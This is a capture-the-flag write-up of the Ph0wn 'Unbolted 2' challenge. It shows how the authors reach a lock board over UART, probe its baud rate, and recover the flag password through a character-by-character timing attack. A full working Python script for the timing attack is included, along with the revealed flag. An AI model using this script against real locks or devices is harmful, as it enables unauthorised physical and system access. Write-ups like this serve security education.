# Unbolted 2 by Le Barbier and Cryptax

This challenge was created by **Le Barbier**. The write-up is by Le Barbier and *Cryptax*.

## Description

The description of the challenge gives us a beautiful shakespearian poem:

```
In Wooku Manor's maze, love's tale takes flight,
Pico, the ardent suitor, glimpses Juliet's light.
Facing yet another lock, his heart in a race,
The serial port, a barrier to embrace.

With urgency, he must connect and align,
Time, the essence, as the stars start to incline.
"Oh, Juliet, within this port doth lie,
The key to reunite, under night's celestial sky.

Time, a fleeting wisp in fate's grand design,
Unlocking this port, our destinies entwine."
```

There are 2 hints in this description:

1. Serial port
2. Time

## Connecting to the serial port

We connect the board to a UART to USB device:

- GND of board to GND of UART2USB
- 3V3 of board to 3V3 of UART2USB
- RX of board to TX of UART2USB
- TX of board to RX of UART2USB

![](./images/unbolted2-uart-to-lock.jpg){ width=70% }

## Baud rate

Then we connect to the board: `picocom /dev/ttyUSB0 -b 9600`. But it does not respond... The baud rate is perhaps wrong. 

So, we try baud rates standard baud rates:

```python
import serial

baudrates = [1200, 2400, 4800, 9600, 19200, 38400, 57600, 115200]

for baud in baudrates:
    try:
        print(f'Trying with baud rate={baud}')
        ser = serial.Serial('/dev/ttyUSB0', baudrate=baud, timeout=2)
        if not ser.is_open:
            ser.open()
        ser.write(b'test\r')
        data = ser.read(20)
        if data != b'':
            print(f'Answers wit baud rate={baud} data={data}')
            break
    except Exception as e:
        print(e)
        pass
```

We run the program and see the device uses baud rate **57600**:

```
Trying with baud rate=1200
Trying with baud rate=2400
Trying with baud rate=4800
Trying with baud rate=9600
Trying with baud rate=19200
Trying with baud rate=38400
Trying with baud rate=57600
Answers wit baud rate=57600 data=b'\r\nBad Command, try a'
```

## 

So, we connect with `picocom /dev/ttyUSB0 -b 57600`. We get the following menu:

```
Bad Command, try again !



Please enter your command (Only available by an administrator) :

		**RESET     : Reset the lock system
		**EMERGENCY : Only for emergency opening
		**ERASE     : Erase Logs
		**FLAG      : Ph0wn CTF flag
		**HELP      : This menu

Type your command here:
```

All commands require a password:

```
RESET

Enter your password : 
test

Bad Command, try again !
```

We try the FLAG command. It requires a password too:

```
Enter your password : 

*** local echo: yes ***
t
Incorrect password!
```

However we notice the program takes longer if we provide a password beginning with `ph0wn{`. If we supply password `verylong`, it answer quickly. So, we suppose this is because indeed the password begins with `ph0wn{` and that there is a time attack, as hinted by the description.

## Implementing the time attack

The time attack consists in supplying potential password characters until one of the character takes substantially more time to check by the program: it means the character is correct and program needs to test the next character. 

As time measurements can vary, we measure time several times for the same character and take the average value.

The solution script is written at the end. It finds the flag in a few minutes.

![](./images/unbolted2-running.png){ width=60% }

The flag is `ph0wn{U4rT_t1m1Ng_4tT4cK}`.

## Solution script

```python
import serial
import time
import string
from statistics import mean

# Open serial connection
ser = serial.Serial('/dev/ttyUSB0', 57600)

if not ser.is_open:
    ser.open()

print('Connected')   

# Send FLAG command
command = b'FLAG\r'
print(f"==> {command}")
ser.write(command)
print(f"<== {ser.readlines(3)}")
print(f"Starting time: {time.ctime()}")

# Timing attack
password = ""
old_average = 0.0

while True:
    average = []
    # Iterate over 3 random characters to have a correct starting average:
    for c in '#|~"':
        tmpPwd = password + c + "\r"
        start_time = time.time()
        ser.write(bytes(tmpPwd, "utf-8"))
        result = ser.readlines(2)
        average.append(time.time() - start_time)

        print(f'Average computed: {average}')
    
    # Iterate over all printable characters
    for c in string.printable:
        tmpPwd = password + c + "\r"
        print(f'Trying {tmpPwd}')
        start_time = time.time()
        ser.write(bytes(tmpPwd, "utf-8"))
        result = ser.readlines(2)
        if "Incorrect password" not in str(result):
            print(f"Flag: {password+c}")
            print(f"Ending time: {time.ctime()}")
            exit()
        current_time = time.time() - start_time
        average.append(current_time)
        current_average = mean(average)
        
        # If response time is higher than usual
        if (current_time-old_average) > (current_average-old_average)*1.3:
            print(f'Higher than usual, lets retry 3 times')
            start_time = time.time()
            ser.write(bytes(tmpPwd, "utf-8"))
            result = ser.readlines(2)
            current_time = time.time() - start_time
            # Retry 3 times to be sure that the response time is always higher
            correct_average = []
            for i in range(3):
                start_time = time.time()
                ser.write(bytes(tmpPwd, "utf-8"))
                result = ser.readlines(2)
                current_time = time.time() - start_time
                correct_average.append(current_time)
                
            # If it's the case, we found a new character
            if (mean(correct_average)-old_average) > (current_average-old_average)*1.3:
                old_average = current_average
                password += c
                print(f'password={password}')
                break
        
print(password)
```

\newpage
